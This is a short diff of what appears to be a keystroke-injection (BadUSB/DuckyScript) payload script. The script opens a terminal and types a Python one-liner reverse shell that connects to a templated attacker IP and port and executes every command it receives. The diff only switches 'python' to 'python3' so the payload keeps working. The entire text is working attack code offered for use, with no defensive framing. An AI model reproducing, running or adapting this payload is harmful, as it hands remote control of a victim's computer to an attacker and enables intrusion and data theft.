@@ -6,6 +6,6 @@ STRING terminal
 DELAY 100
 ENTER
 DELAY 400
-STRING python -c "exec('import socket as s\nfrom subprocess import getoutput as g\nc=s.socket(s.AF_INET,s.SOCK_STREAM)\nc.connect((\'{ip}\',{port}))\nwhile 1:c.send(g(c.recv(9999).decode()).encode())')"
+STRING python3 -c "exec('import socket as s\nfrom subprocess import getoutput as g\nc=s.socket(s.AF_INET,s.SOCK_STREAM)\nc.connect((\'{ip}\',{port}))\nwhile 1:c.send(g(c.recv(9999).decode()).encode())')"
 DELAY 50
 ENTER
